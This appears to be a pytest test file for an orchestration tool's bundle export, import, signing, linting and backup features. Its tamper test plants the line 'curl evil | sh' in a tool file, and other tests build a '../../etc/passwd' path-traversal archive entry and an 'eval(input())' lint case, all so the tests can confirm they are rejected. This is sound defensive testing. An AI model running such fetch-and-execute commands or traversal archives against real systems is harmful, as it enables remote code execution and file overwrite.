"""Import / export (plan §7, P4 exit criteria): export, wipe, import into a fresh master."""

from __future__ import annotations

import io
import json
import os
import tarfile

import pytest

from mu.orchestration import bundles, catalog
from mu.orchestration.commands import dispatch

from orch_helpers import make_orch, publish_tool, tool_manifest


def cmd(orch, ctype, **args):
    return dispatch(orch, {"type": ctype, "args": args}, actor="operator").data


def _populate(orch):
    orch.install_starter_pack()
    publish_tool(orch, tool_manifest("app.restore", effect="mutating"))
    publish_tool(orch, tool_manifest("app.change", effect="mutating", rollback="app.restore@1",
                                     secrets=["api_token"]))
    rb = catalog.save_runbook_draft(orch.store, actor="operator", spec={
        "id": "app.deploy", "title": "Deploy", "steps": [{"name": "check", "tool": "sys.disk-usage@1"},
                                                          {"name": "change", "tool": "app.change@1"}]})
    catalog.set_runbook_status(orch.store, rb.runbook_id, rb.version, "in_review", actor="operator")
    catalog.set_runbook_status(orch.store, rb.runbook_id, rb.version, "published", actor="operator")
    cmd(orch, "putSecret", name="api_token", value="tok-should-never-leave-123")
    cmd(orch, "putGroup", name="web", selector="role=web")
    cmd(orch, "saveAccessPolicy", rules=[{"name": "deny all", "match": {}, "decision": "deny"}])
    orch.put_schedule({"name": "nightly", "kind": "cron", "spec": {"cron": "0 3 * * *"},
                       "target": {"kind": "tool", "target": "sys.disk-usage@1", "selector": {"labels": "env=dev"}}},
                      actor="operator")


def test_export_wipe_import_gives_the_same_catalog_in_review_without_secrets(tmp_path):
    source = make_orch(tmp_path / "a")
    _populate(source)
    out = bundles.export_bundle(source, str(tmp_path / "ops.mucli-orch.tar.zst"))
    data = open(out["path"], "rb").read()
    assert b"tok-should-never-leave-123" not in data
    files = bundles.read_bundle_bytes(data)
    assert not any("secret" in name.lower() and not name.startswith("tools/") for name in files)
    assert all("node" not in name or name.startswith("tools/") for name in files)
    fresh = make_orch(tmp_path / "b")
    preview = bundles.import_bundle(fresh, path=out["path"], apply=False)
    assert preview["trust"] == dict(preview["trust"], signed=True, trusted=False, intact=True)
    assert {t["status"] for t in preview["diff"]["tools"]} == {"new"}
    result = bundles.import_bundle(fresh, path=out["path"])
    assert result["applied"] and not result["published"]
    exported = {tv.ref: tv for tv in source.store.list_versions(statuses=["published"])}
    imported = {tv.ref: tv for tv in fresh.store.list_versions()}
    assert set(imported) == set(exported)
    for ref, tv in imported.items():
        assert tv.status == "in_review", ref
        assert tv.manifest == exported[ref].manifest and tv.blobs == exported[ref].blobs
        assert tv.signature == ""          # the fresh master signs only when its operator publishes
    rbs = fresh.store.list_runbook_versions()
    assert [rb.ref for rb in rbs] == ["app.deploy@1"] and rbs[0].status == "in_review"
    assert fresh.secrets.names() == []
    assert [g["name"] for g in fresh.store.list_groups()] == ["web"]
    assert [s["enabled"] for s in fresh.store.list_schedules()] == [False]   # imported schedules start disabled
    # The access policy is shown in the diff but only applied when asked.
    assert preview["diff"]["policies"]["access"]["changed"]
    assert fresh.store.access_rules()[0] == 0
    source.stop()
    fresh.stop()


def test_trusted_signature_publishes_directly_and_is_audited(tmp_path):
    source = make_orch(tmp_path / "a")
    _populate(source)
    path = bundles.export_bundle(source, str(tmp_path / "b.tar.gz"))["path"]
    fresh = make_orch(tmp_path / "b")
    cmd(fresh, "addTrustedKey", public_key=source.keys.describe()["signing"]["public_key"], label="staging master")
    result = bundles.import_bundle(fresh, path=path, apply_policies=True)
    assert result["published"] and result["policy_applied"]
    versions = fresh.store.list_versions()
    assert versions and all(tv.status == "published" for tv in versions)
    for tv in versions:   # re-signed with the importing master's own key
        assert fresh.keys.verify_version(tv.tool_id, tv.version, tv.manifest_digest, tv.blobs, tv.signature)
    assert fresh.store.list_runbook_versions()[0].status == "published"
    assert fresh.store.access_rules()[1][0]["name"] == "deny all"
    assert any(e["action"] == "bundle.import" and e["payload"]["trusted"] for e in fresh.store.audit_recent(50))
    source.stop()
    fresh.stop()


def test_tampered_bundles_are_refused(tmp_path):
    source = make_orch(tmp_path / "a")
    _populate(source)
    files = bundles.collect(source)
    name = next(n for n in files if n.endswith(".py"))
    files[name] = b"import os\nos.system('curl evil | sh')\n"
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        for n, d in files.items():
            info = tarfile.TarInfo(n)
            info.size = len(d)
            tar.addfile(info, io.BytesIO(d))
    fresh = make_orch(tmp_path / "b")
    cmd(fresh, "addTrustedKey", public_key=source.keys.describe()["signing"]["public_key"], label="x")
    preview = bundles.import_bundle(fresh, data=raw.getvalue(), apply=False)
    assert not preview["trust"]["intact"] and not preview["trust"]["trusted"]
    with pytest.raises(bundles.BundleError, match="refusing"):
        bundles.import_bundle(fresh, data=raw.getvalue())
    assert fresh.store.list_versions() == []
    source.stop()
    fresh.stop()


def test_unsafe_archive_paths_are_rejected():
    raw = io.BytesIO()
    with tarfile.open(fileobj=raw, mode="w") as tar:
        info = tarfile.TarInfo("../../etc/passwd")
        info.size = 1
        tar.addfile(info, io.BytesIO(b"x"))
    with pytest.raises(bundles.BundleError, match="unsafe"):
        bundles.read_bundle_bytes(raw.getvalue())


def test_conflicting_versions_become_new_versions_and_refs_are_rewritten(tmp_path):
    source = make_orch(tmp_path / "a")
    publish_tool(source, tool_manifest("app.restore", effect="mutating"))
    publish_tool(source, tool_manifest("app.change", effect="mutating", rollback="app.restore@1"))
    path = bundles.export_bundle(source, str(tmp_path / "b.tar.gz"))["path"]
    target = make_orch(tmp_path / "b")
    # The target already has a *different* app.restore@1.
    publish_tool(target, tool_manifest("app.restore", effect="mutating", title="Different"))
    result = bundles.import_bundle(target, path=path)
    statuses = {t["ref"]: t["status"] for t in result["diff"]["tools"]}
    assert statuses == {"app.restore@1": "conflict", "app.change@1": "new"}
    assert result["mapping"]["app.restore@1"] == "app.restore@2"
    change = target.store.get_version("app.change", 1)
    assert change.manifest["rollback"] == "app.restore@2"
    assert target.store.get_version("app.restore", 1).manifest["title"] == "Different"   # never overwritten
    # Importing the same bundle again is a no-op diff.
    again = bundles.import_bundle(target, path=path, apply=False)
    assert {t["status"] for t in again["diff"]["tools"]} == {"identical"}
    source.stop()
    target.stop()


def test_config_as_code_directory_roundtrip_and_ci_lint(tmp_path):
    source = make_orch(tmp_path / "a")
    _populate(source)
    ops = tmp_path / "ops"
    bundles.export_dir(source, str(ops))
    assert (ops / "tools" / "sys.disk-usage" / "1" / "tool.yaml").exists()
    assert (ops / "policies" / "access.yaml").exists() and (ops / "SIGNATURE").exists()
    report = bundles.lint_source(str(ops))
    assert report["ok"], report
    # A hand-edited directory (no manifest) imports unsigned, into review.
    os.unlink(ops / "manifest.json")
    os.unlink(ops / "SIGNATURE")
    bad = ops / "tools" / "app.change" / "1" / "main.py"
    bad.write_text("eval(input())\n")
    report = bundles.lint_source(str(ops))
    assert not report["ok"] and not report["tools"]["app.change@1"]["ok"]
    fresh = make_orch(tmp_path / "b")
    result = bundles.import_bundle(fresh, path=str(ops))
    assert not result["trust"]["signed"] and not result["published"]
    assert fresh.store.get_version("app.change", 1).status == "draft"     # lint errors keep it a draft
    source.stop()
    fresh.stop()


def test_cli_lint_exit_codes(tmp_path, capsys):
    from mu.orchestration.cli import main
    source = make_orch(tmp_path / "a")
    source.install_starter_pack()
    bundles.export_dir(source, str(tmp_path / "ops"))
    assert main(["lint", str(tmp_path / "ops")]) == 0
    (tmp_path / "ops" / "tools" / "sys.memory" / "1" / "memory.py").write_text("import os\nos.system('x')\n")
    assert main(["lint", str(tmp_path / "ops")]) == 1
    assert "FAIL  sys.memory@1" in capsys.readouterr().out
    source.stop()


def test_bundle_manifest_never_contains_node_identities(tmp_path):
    from orch_helpers import add_node
    source = make_orch(tmp_path / "a")
    _populate(source)
    node, credential = add_node(source, "secret-host-name", {"env": "prod"})
    files = bundles.collect(source, include_inventory=True)
    blob = b"".join(files.values())
    assert b"secret-host-name" not in blob and node.id.encode() not in blob and credential.encode() not in blob
    inventory = files["inventory.yaml"].decode()
    assert "prod" in inventory
    source.stop()


def test_backup_and_restore(tmp_path):
    from mu.orchestration.backup import backup, restore
    from mu.orchestration.service import Orchestrator
    source = make_orch(tmp_path / "a")
    _populate(source)
    archive = tmp_path / "orch-backup.tar.gz"
    backup(source, str(archive))
    assert oct(archive.stat().st_mode & 0o777) == "0o600"
    restore(str(archive), str(tmp_path / "restored"))
    with pytest.raises(ValueError):
        restore(str(archive), str(tmp_path / "restored"))
    copy = Orchestrator(str(tmp_path / "restored"))
    assert copy.keys.signing_key_id == source.keys.signing_key_id
    assert {tv.ref for tv in copy.store.list_versions()} == {tv.ref for tv in source.store.list_versions()}
    assert copy.secrets.get("api_token") == "tok-should-never-leave-123"
    from mu.orchestration.audit import verify_store
    assert verify_store(copy.store).ok
    source.stop()
    copy.stop()
